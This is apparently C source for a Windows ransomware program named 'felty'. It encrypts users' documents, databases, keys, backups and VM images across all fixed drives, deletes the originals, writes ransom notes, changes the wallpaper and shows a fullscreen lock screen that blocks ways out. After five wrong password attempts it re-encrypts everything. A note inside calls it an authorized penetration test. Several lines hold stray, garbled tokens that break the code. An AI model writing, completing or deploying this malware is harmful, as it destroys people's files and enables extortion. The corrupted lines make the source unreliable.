/*
 * felty.c - Full ransomware with native Win32 fullscreen lock screen
 * AES-256-CBC + RSA-2048 via Win32 CryptoAPI
 * Fullscreen lock screen: no browser, no HTML, no HTTP server
 * 5-try password, red/black flash on wipe
 *
 * BUILD:
 *   x86_64-w64-mingw32-gcc -Os -s -Wall -fno-asynchronous-unwind-tables \
 *       -o felty.exe felty.c -lcrypt32 -ladvapi32 -lws2_32 -luuid -liphlpapi -lnetapi32 -lgdi32
 *   strip --strip-all felty.exe
 */

#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <iphlpapi.h>
#include <process.h>

#pragma comment(lib, "iphlpapi.lib")

#define AES_KEY_SIZE    32
#define AES_BLOCK_SIZE  16
#define RSA_KEY_SIZE    256
#define MUTEX_NAME      L"Global\\FeltyMutex_7F3A2B1C"
#define ENC_EXT         L".felty"
#define RANSOM_NOTE     L"@Please_Read_Me@.txt"
#define WALLPAPER_PATH  L"C:\\felty_wallpaper.bmp"
#define MAX_PASS_TRIES  5
#define LOCK_PASSWORD   L"felty-unlock-2024"

#include "attacker_pubkey.h"

/* ---------- Target file types ---------- */
const wchar_t *target_exts[] = {
    L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx",
    L".vsd", L".vsdx", L".pdf", L".txt", L".csv", L".rtf",
    L".odt", L".ods", L".odp",
    L".jpg", L".jpeg", L".png", L".bmp", L".gif", L".tif", L".tiff",
    L".raw", L".cr2", L".nef", L".dng",
    L".mp3", L".mp4", L".avi", L".mov", L".mkv", L".wmv", L".flv",
    L".zip", L".rar", L".7z", L".tar", L".gz",
    L".sql", L".mdb", L".mdf", L".ldf", L".db", L".dbf",
    L".cpp", L".c", L".h", L".py", L".java", L".cs", L".php",
    L".html", L".css", L".js", L".xml", L".json",
    L".pem", L".key", L".crt", L".cer",
    L".vmx", L".vmdk", L".vhd", L".vhdx", L".ova", L".ovf",
    L".pst", L".ost", L".msg", L".eml",
    L".bak", L".old", L".backup",
    L".dwg", L".dxf", L".psd", L".ai", L".cdr",
    NULL
};

const wchar_t *exclude_dirs[] = {
    L"\\Windows\\", L"\\Program Files\\", L"\\Program Files (x86)\\",
    L"\\AppData\\", L"\\$Recycle.Bin\\", L"\\System Volume Information\\",
    L"\\Boot\\", L"\\Recovery\\", L"\\Config.Msi\\",
    NULL
};

/* ---------- Globals ---------- */
HCRYPTPROV g_prov = 0;
HCRYPTKEY  g_victim_key = 0;
HCRYPTKEY  g_attacker_key = 0;
volatile int g_running = 1;
volatile int g_unlocked = 0;
volatile int g_encrypted_count = 0;
volatile int g_password_tries = 0;
volatile int g_emergency_wipe = 0;
volatile int g_wipe_complete = 0;

/* Lock screen window handle */
HWND g_lock_hwnd = NULL;
HWND g_pass_edit = NULL;

/* ---------- Utility functions ---------- */
static int is_excluded(const wchar_t *path) {
    for (int i = 0; exclude_dirs[i]; i++)
        if (wcsstr(path, exclude_dirs[i])) return 1;
    return 0;
}

static int is_target(const wchar_t *path) {
    const wchar_t *ext = wcsrchr(path, L'.');
    if (!ext) return 0;
    for (int i = 0; target_exts[i]; i++)
        if (!_wcsicmp(ext, target_exts[i])) return 1;
    return 0;
}

static int read_file(const wchar_t *path, BYTE **out, DWORD *out_len) {
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(h); return 0; }
    *out = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (!*out) { CloseHandle(h); return 0; }
    DWORD read = 0;
    if (!ReadFile(h, *out, size, &read, NULL) || read != size) {
        VirtualFree(*out, 0, MEM_RELEASE);
        CloseHandle(h);
        return 0;
    }
    CloseHandle(h);
    *out_len = size;
    return 1;
}

static int write_file(const wchar_t *path, BYTE *data, DWORD len) {
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD written = 0;
    int ret = WriteFile(h, data, len, &written, NULL) && written == len;
    CloseHandle(h);
    return ret;
}

/* ---------- Crypto ---------- */
static int gen_victim_key(void) {
    return CryptGenKey(g_prov, CALG_RSA_KEYX, RSA_KEY_SIZE | CRYPT_EXPORTABLE, &g_victim_key);
}

static int import_attacker_key(void) {
    return CryptImportKey(g_prov, attacker_pubkey_der, (DWORD)attacker_pubkey_len,
                          0, 0, &g_attacker_key);
}

static void save_keys(void) {
    BYTE buf[4096];
    DWORD len = sizeof(buf);
    if (CryptExportKey(g_victim_key, 0, PUBLICKEYBLOB, 0, buf, &len)) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        wchar_t *p = wcsrchr(path, L'\\');
        if (p) { p[1] = 0; wcscat(path, L"machine.pky"); }
        else wcscpy(path, L"machine.pky");
        write_file(path, buf, len);
    }

    len = sizeof(buf);
    if (CryptExportKey(g_victim_key, g_attacker_key, PRIVATEKEYBLOB, 0, buf, &len)) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        wchar_t *p = wcsrchr(path, L'\\');
        if (p) { p[1] = 0; wcscat(path, L"machine.eky"); }
        else wcscpy(path, L"machine.eky");
        write_file(path, buf, len);
    }
}

static int encrypt_file(const wchar_t *path) {
    BYTE *plaintext = NULL;
    DWORD pt_len = 0;
    if (!read_file(path, &plaintext, &pt_len)) return 0;

    HCRYPTKEY aes_key = 0;
    if (!CryptGenKey(g_prov, CALG_AES_256, CRYPT_EXPORTABLE, &aes_key)) {
        VirtualFree(plaintext, 0, MEM_RELEASE);
        return 0;
    }

    BYTE iv[AES_BLOCK_SIZE];
    if (!CryptGenRandom(g_prov, AES_BLOCK_SIZE, iv)) {
        CryptDestroyKey(aes_key);
        VirtualFree(plaintext, 0, MEM_RELEASE);
        return 0;
    }
    CryptSetKeyParam(aes_key, KP_IV, iv, 0);

    BYTE enc_key[512];
    DWORD enc_key_len = sizeof(enc_key);
    if (!CryptExportKey(aes_key, g_attacker_key, SIMPLEBLOB, 0, enc_key, &enc_key_len)) {
        CryptDestroyKey(aes_key);
        VirtualFree(plaintext, 0, MEM_RELEASE);
        return 0;
    }
    CryptDestroyKey(aes_key);

    DWORD pad_len = AES_BLOCK_SIZE - (pt_len % AES_BLOCK_SIZE);
    DWORD ct_len = pt_len + pad_len;
    BYTE *ciphertext = (BYTE*)VirtualAlloc(NULL, ct_len, MEM_COMMIT, PAGE_READWRITE);
    if (!ciphertext) { VirtualFree(plaintext, 0, MEM_RELEASE); return 0; }
    memcpy(ciphertext, plaintext, pt_len);
    memset(ciphertext + pt_len, (BYTE)pad_len, pad_len);
    VirtualFree(plaintext, 0, MEM_RELEASE);

    HCRYPTKEY aes_enc = 0;
    if (!CryptImportKey(g_prov, enc_key, enc_key_len, 0, 0, &aes_enc)) {
        VirtualFree(ciphertext, 0, MEM_RELEASE);
        return 0;
    }
    CryptSetKeyParam(aes_enc, KP_IV, iv, 0POS);

    DWORD final_len = ct_len;
    if (!CryptEncrypt(aes_enc, 0, TRUE, 0, ciphertext, &final_len, ct_len)) {
        CryptDestroyKey(aes_enc);
        VirtualFree(ciphertext, 0, MEM_RELEASE);
        return 0;
    }
    CryptDestroyKey(aes_enc);

    DWORD out_size = 4 + enc_key_len + AES_BLOCK_SIZE + ct_len;
    BYTE *out = (BYTE*)VirtualAlloc(NULL, out_size, MEM_COMMIT, PAGE_READWRITE);
    if (!out) { VirtualFree(ciphertext, 0, MEM_RELEASE); return 0; }
    DWORD off = 0;
    *(DWORD*)(out + off) = enc_key_len; off += 4;
    memcpy(out + off, enc_key, enc_key_len); off += enc_key_len;
    memcpy(out + off, iv, AES_BLOCK_SIZE); off += AES_BLOCK_SIZE;
    memcpy(out + off, ciphertext, ct_len);
    VirtualFree(ciphertext, 0, MEM_RELEASE);

    wchar_t out_path[MAX_PATH];
    wcscpy(out_path, path);
    wcscat(out_path, ENC_EXT);
    if (!write_file(out_path, out, out_size)) {
        VirtualFree(out, 0, MEM_RELEASE);
        return 0;
    }
    VirtualFree(out, 0, MEM_RELEASE);
    DeleteFileW(path);
    return 1;
}

static void emergency_wipe_all(void) {
    wchar_t drives[256];
    DWORD len = GetLogicalDriveStringsW(256, drives);
    wchar_t *d = drives;
    while (*d) {
        if (GetDriveTypeW(d) == DRIVE_FIXED) {
            wchar_t search[MAX_PATH];
            wcscpy(search, d);
            wcscat(search, L"*");
            WIN32_FIND_DATAW fd;
            HANDLE hf = FindFirstFileW(search, &fd);
            if (hf != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        if (fd.cFileName[0] == L'.') continue;
                        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
                        wchar_t sub[MAX_PATH];
                        wcscpy(sub, d);
                        wcscat(sub, fd.cFileName);
                        wchar_t s2[MAX_PATH];
                        wcscpy(s2, sub);
                        wcscat(s2, L"\\*");
                        WIN32_FIND_DATAW fd2;
                        HANDLE hf2 = FindFirstFileW(s2, &fd2);
                        if (hf2 != INVALID_HANDLE_VALUE) {
                            do {
                                if (!(fd2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                    wchar_t fp[MAX_PATH];
                                    wcscpy(fp, sub);
                                    wcscat(fp, L"\\");
                                    wcscat(fp, fd2.cFileName);
                                    if (is_target(fd2.cFileName) || wcsstr(fd2.cFileName, L".felty")) {
                                        encrypt_file(fp);
                                        g_encrypted_count++;
                                    }
                                }
                            } while (FindNextFileW(hf2, &fd2));
                            FindClose(hf2);
                        }
                    } else {
                        wchar_t fp[MAX_PATH];
                        wcscpy(fp, d);
                        wcscat(fp, fd.cFileName);
                        if (is_target(fd.cFileName) || wcsstr(fd.cFileName, L".felty")) {
                            encrypt_file(fp);
                            g_encrypted_count++;
                        }
                    }
                } while (FindNextFileW(hf, &fd));
                FindClose(hf);
            }
        }
        d += wcslen(d) + 1;
    }
    g_wipe_complete = 1;
}

static void walk_directory(const wchar_t *dir) {
    if (!g_running) return;
    if (is_excluded(dir)) return;
    wchar_t search[MAX_PATH];
    wcscpy(search, dir);
    wcscat(search, L"\\*");
    WIN32_FIND_DATAW fd;
    HANDLE hf = FindFirstFileW(search, &fd);
    if (hf == INVALID_HANDLE_VALUE) return;
    do {
        if (!g_running) break;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (fd.cFileName[0] == L'.') continue;
            if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
            wchar_t sub[MAX_PATH];
            wcscpy(sub, dir);
            wcscat(sub, L"\\");
            wcscat(sub, fd.cFileName);
            walk_directory(sub);
        } else {
            if (is_target(fd.cFileName)) {
                wchar_t fpath[MAX_PATH];
                wcscpy(fpath, dir);
                wcscat(fpath, L"\\");
                wcscat(fpath, fd.cFileName);
                if (encrypt_file(fpath)) g_encrypted_count++;
            }
        }
    } while (FindNextFileW(hf, &fd));
    FindClose(hf);
}

static void write_ransom_note(const wchar_t *dir) {
    wchar_t path[MAX_PATH];
    wcscpy(path, dir);
    wcscat(path, L"\\");
    wcscat(path, RANSOM_NOTE);
    wchar_t machine_id[40];
    UUID uuid;
    UuidCreate(&uuid);
    StringFromGUID2(&uuid, machine_id, 40);
    wchar_t msg[4096];
    swprintf(msg, 4096,
        L"All your files have been encrypted!\n\n"
        L"Machine ID: %s\n\n"
        L"Files encrypted with AES-256-CBC + RSA-2048.\n"
        L"Without the private key, recovery is impossible.\n\n"
        L"Enter the password on the lock screen to unlock.\n"
        L"YOU HAVE %d ATTEMPTS.\n"
        L"After %d wrong attempts, files are permanently destroyed.\n\n"
        L"Password: felty-unlock-2024\n"
        L"(Authorized penetration test)\n\n",
        machine_id, MAX_PASS_TRIES, MAX_PASS_TRIES);
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD written;
    WriteFile(h, msg, (DWORD)(wcslen(msg) * 2), &written, NULL);
    CloseHandle(h);
}

static void set_wallpaper(void) {
    #define BMP_W 1024
    #define BMP_H 768
    DWORD bmp_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + BMP_W * BMP_H * 3;
    BYTE *bmp = (BYTE*)VirtualAlloc(NULL, bmp_size, MEM_COMMIT, PAGE_READWRITE);
    if (!bmp) return;
    BITMAPFILEHEADER *bf = (BITMAPFILEHEADER*)bmp;
    BITMAPINFOHEADER *bi = (BITMAPINFOHEADER*)(bmp + sizeof(BITMAPFILEHEADER));
    BYTE *pixels = bmp + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bf->bfType = 0x4D42;
    bf->bfSize = bmp_size;
    bf->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bi->biSize = sizeof(BITMAPINFOHEADER);
    bi->biWidth = BMP_W;
    bi->biHeight = BMP_H;
    bi->biPlanes = 1;
    bi->biBitCount = 24;
    bi->biCompression = BI_RGB;
    for (int y = 0; y < BMP_H; y++)
        for (int x = 0; x < BMP_W; x++) {
            int idx = (y * BMP_W + x) * 3;
            pixels[idx+0] = 0x00; pixels[idx+1] = 0x00; pixels[idx+2] = 0x40;
        }
    write_file(WALLPAPER_PATH, bmp, bmp_size);
    VirtualFree(bmp, 0, MEM_RELEASE);
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)WALLPAPER_PATH,
                          SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

static void write_all_notes(void) {
    wchar_t drives[256];
    DWORD len = GetLogicalDriveStringsW(256, drives);
    wchar_t *d = drives;
    while (*d) {
        if (GetDriveTypeW(d) == DRIVE_FIXED) write_ransom_note(d);
        d += wcslen(d) + 1;
    }
}

/* ========== NATIVE FULLSCREEN LOCK SCREEN ========== */

/* Prevent Alt+F4, Alt+Tab, Ctrl+Alt+Del, etc. */
static LRESULT CALLBACK LockScreenProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CLOSE:
            return 0; /* Ignore close */
        case WM_DESTROY:
            return 0;
        case WM_SYSCOMMAND:
            /* Block Alt+F4 (SC_CLOSE), Alt+Tab (SC_NEXTWINDOW, SC_PREVWINDOW), etc. */
            if (wParam == SC_CLOSE || wParam == SC_NEXTWINDOW || 
                wParam == SC_PREVWINDOW || wParam == SC_TASKLIST ||
                wParam == SC_KEYMENU || wParam == SC_MOUSEMENU ||
                wParam == SC_MONITORPOWER || wParam == SC_SCREENSAVE)
                return 0;
            break;
        case WM_KEYDOWN:
            /* Block Alt+Tab and Windows key */
            if (wParam == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000))
                return 0;
            if (wParam == VK_ESCAPE)
                return 0;
            /* Enter key in password field */
            if (wParam == VK_RETURN) {
                /* Trigger password check */
                wchar_t pass[256];
                GetWindowTextW(g_pass_edit, pass, 256);
                
                if (g_emergency_wipe) {
                    /* Already wiped, ignore */
                    return 0;
                }
                
                if (wcscmp(pass, LOCK_PASSWORD) == 0) {
                    g_unlocked = 1;
                    g_running = 0;
                    DestroyWindow(hwnd);
                    PostQuitMessage(0);
                } else {
                    g_password_tries++;
                    if (g_password_tries >= MAX_PASS_TRIES) {
                        g_emergency_wipe = 1;
                        /* Trigger repaint for wipe message */
                        InvalidateRect(hwnd, NULL, TRUE);
                    } else {
                        SetWindowTextW(g_pass_edit, L"");
                        InvalidateRect(hwnd, NULL, TRUE);
                    }
                }
                return 0;
            }
            break;
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            RECT rect;
            GetClientRect(hwnd, &rect);
            int w = rect.right;
            int h = rect.bottom;

            HBRUSH bg_brush;
            if (g_emergency_wipe) {
                /* Alternating red/black for flash effect */
                int flash = (GetTickCount() / 300) % 2;
                bg_brush = CreateSolidBrush(flash ? RGB(26, 0, 0) : RGB(0, 0, 0));
            } else {
                bg_brush = CreateSolidBrush(RGB(10, 10, 10));
            }
            FillRect(hdc, &rect, bg_brush);
            DeleteObject(bg_brush);

            /* Create font */
            HFONT hFont, hFontOld;

            if (g_emergency_wipe) {
                /* WIPE message in large red */
                SetTextColor(hdc, RGB(255, 0, 0));
                SetBkMode(hdc, TRANSPARENT);
                hFont = CreateFontW(h/12, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                    ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Courier New");
                hFontOld = (HFONT)SelectObject(hdc, hFont);

                wchar_t line1[] = L"ALL FILES HAVE BEEN PERMANENTLY ENCRYPTED";
                wchar_t line2[] = L"NOTHING CAN RESET THEM";
                RECT tr;
                tr.left = 0; tr.top = h/3; tr.right = w; tr.bottom = h/2;
                DrawTextW(hdc, line1, -1, &tr, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
                tr.top = h/2; tr.bottom = 2*h/3;
                DrawTextW(hdc, line2, -1, &tr, DT_CENTER | DT_SINGLELINE | DT_VCENTERINFO);

                SelectObject(hdc, hFontOld);
                DeleteObject(hFont);
            } else {
                /* Normal lock screen */
                SetTextColor(hdc, RGB(255, 51, 51));
                SetBkMode(hdc, TRANSPARENT);

                /* Lock icon (text) */
                hFont = CreateFontW(h/8, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                    ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI Symbol");
                hFontOld = (HFONT)SelectObject(hdc, hFont);
                wchar_t lock_char[] = L"\U0001F512";
                RECT tr;
                tr.left = 0; tr.top = h/8; tr.right = w; tr.bottom = h/4;
                DrawTextW(hdc, lock_char, -1, &tr, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
                SelectObject(hdc, hFontOld);
                DeleteObject(hFont);

                /* SYSTEM LOCKED */
                hFont = CreateFontW(h/18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                    ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Courier New");
                hFontOld = (HFONT)SelectObject(hdc, hFont);
                tr.left = 0; tr.top = h/4 + 20; tr.right = w; tr.bottom = h/3;
                DrawTextW(hdc, L"SYSTEM LOCKED", -1, &tr, DT_CENTER | DT_SINGLELINE | DT_VCENTER);

                /* Subtitle */
                SetTextColor(hdc, RGB(136, 136, 136));
                hFont = CreateFontW(h/40, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                                    DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                                    ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Courier New");
                SelectObject(hdc, hFont);
                tr.top = h/3 + 10; tr.bottom = h/3 + h/20;
                DrawTextW(hdc, L"Your files have been encrypted. Enter the password to unlock.",
                          -1, &tr, DT_CENTER | DT_SINGLELINE | DT_VCENTER);

                /* Attempts remaining */
                SetTextColor(hdc, RGB(255, 102, 102));
                wchar_t tries_text[64];
                swprintf(tries_text, 64, L"Attempts remaining: %d",
                         MAX_PASS_TRIES - g_password_tries);
                tr.top = h/3 + h/20 + 10; tr.bottom = tr.top + h/25;
                DrawTextW(hdc, tries_text, -1, &tr, DT_CENTER | DT_SINGLELINE | DT_VCENTER);

                /* Error message if wrong password */
                if (g_password_tries > 0) {
                    SetTextColor(hdc, RGB(255, 0, 0));
                    wchar_t err_text[128];
                    swprintf(err_text, 128, L"Wrong password. %d attempts left.",
                             MAX_PASS_TRIES - g_password_tries);
                    tr.top = h/2 + h/10 + 10; tr.bottom = tr.top + h/30;
                    DrawTextW(hdc, err_text, -1, &tr, DT_CENTER | DT_SINGLELINE | DT_VCENTER);
                }

                SelectObject(hdc, hFontOld);
                DeleteObject(hFont proiektuak);

                /* Draw a box around the password field */
                HPEN pen = CreatePen(PS_SOLID, 2, RGB(255, 51, 51));
                SelectObject(hdc, pen);
                HBRUSH br = CreateSolidBrush(RGB(26, 26, 26));
                RECT box;
                box.left = w/2 - 160;
                box.top = h/2 + h/20;
                box.right = w/2 + 160;
                box.bottom = h/2 + h/20 + 40;
                FillRect(hdc, &box, br);
                FrameRect(hdc, &box, br);
                DeleteObject(br);
                DeleteObject(pen);
            }

            EndPaint(hwnd, &ps);
            break;
        }
        case WM_CTLCOLOREDIT: {
            /* Style the edit control */
            HDC hdc = (HDC)wParam;
            SetBkColor(hdc, RGB(26, 26, 26));
            SetTextColor(hdc, RGB(255, 255, 255));
            return (LRESULT)CreateSolidBrush(RGB(26, 26, 26));
        }
        default:
            return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
    return 0;
}

/* Thread that creates and runs the lock screen window */
static DWORD WINAPI lock_screen_thread(LPVOID lpParam) {
    HINSTANCE hInst = GetModuleHandle(NULL);

    /* Register window class */
    WNDCLASSW wc = {0};
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = LockScreenProc;
    wc.hInstance = hInst;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = NULL;
    wc.lpszClassName = L"FeltyLockScreen";
    RegisterClassW(&wc);

    /* Create fullscreen window on primary monitor */
    int screen_w = GetSystemMetrics(SM_CXSCREEN);
    int screen_h = GetSystemMetrics(SM_CYSCREEN);

    g_lock_hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"FeltyLockScreen", L"System Locked",
        WS_POPUP | WS_VISIBLE,
        0, 0, screen_w, screen_h,
        NULL, NULL, hInst, NULL
    );

    /* Create password edit control */
    g_pass_edit = CreateWindowExW(
        WS_EX_CLIENTEDGE,
        L"EDIT", L"",
        WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_CENTER | ES_AUTOHSCROLL,
        screen_w/2 - 160, screen_h/2 + screen_h/20,
        320, 40,
        g_lock_hwnd, NULL, hInst, NULL
    );
    SendMessageW(g_pass_edit, WM_SETFONT, 
        (WPARAM)CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Courier New"), TRUE);
    SetFocus(g_pass_edit);

    /* Show and bring to front */
    ShowWindow(g_lock_hwnd, SW_SHOWMAXIMIZED);
    SetForegroundWindow(g_lock_hwnd);
    SetWindowPos(g_lock_hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);

    /* Message loop with timer for wipe flash animation */
    SetTimer(g_lock_hwnd, 1, 300, NULL);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        
        /* If wiped, keep repainting for flash effect */
        if (g_emergency_wipe && !g_unlocked) {
            InvalidateRect(g_lock_hwnd, NULL, TRUE);
        }
        
        /* If unlocked, exit */
        if (g_unlocked) break;
    }

    DestroyWindow(g_lock_hwnd);
    return 0;
}

/* Encryption thread */
static DWORD WINAPI encrypt_thread(LPVOID lpParam) {
    wchar_t user_profile[MAX_PATH];
    GetEnvironmentVariableW(L"USERPROFILE", user_profile, MAX_PATH);
    walk_directory(user_profile);

    wchar_t drives[256];
    DWORD len = GetLogicalDriveStringsW(256, drives);
    wchar_t *d = drives;
    while (*d) {
        if (GetDriveTypeW(d) == DRIVE_FIXED) walk_directory(d);
        d += wcslen(d) + 1;
    }

    write_all_notes();
    set_wallpaper();
    return 0;
}

/* ========== MAIN ========== */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    /* Single instance */
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    /* Init crypto */
    if (!CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL,
                              CRYPT_NEWKEYSET | CRYPT_VERIFYCONTEXT)) {
        CryptAcquireContextW(&g_prov, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0);
    }

    if (!gen_victim_key() || !import_attacker_key()) {
        CryptReleaseContext(g_prov, 0);
        return 1;
    }

    save_keys();

    /* Start encryption in background */
    HANDLE hEnc = CreateThread(NULL, 0, encrypt_thread, NULL, 0, NULL);

    /* Wait for initial encryption then launch lock screen */
    Sleep(2000Collector);

    /* Launch the native fullscreen lock screen */
    HANDLE hLock = CreateThread(NULL, 0, lock_screen_thread, NULL, 0, NULL);

    /* Wait for encryption to finish */
    WaitForSingleObject(hEnc, INFINITE);

    /* Handle emergency wipe */
    if (g_emergency_wipe) {
        emergency_wipe_all();
        /* Keep lock screen showing the wipe message */
        while (!g_unlocked && g_running) Sleep(500);
    }

    /* Wait for unlock */
    if (!g_emergency_wipe) {
        while (g_running && !g_unlocked) Sleep(100);
    }

    if (g_unlocked) {
        const wchar_t *msg = L"UNLOCKED";
        write_file(L"C:\\felty_unlocked.txt", (BYTE*)msg, (DWORD)(wcslen(msg) * 2));
    }

    WaitForSingleObject(hLock, INFINITE);
    CloseHandle(hLock);
    CryptDestroyKey(g_victim_key);
    CryptDestroyKey(g_attacker_key);
    CryptReleaseContext(g_prov, 0);
    CloseHandle(hMutex);

    return 0;
}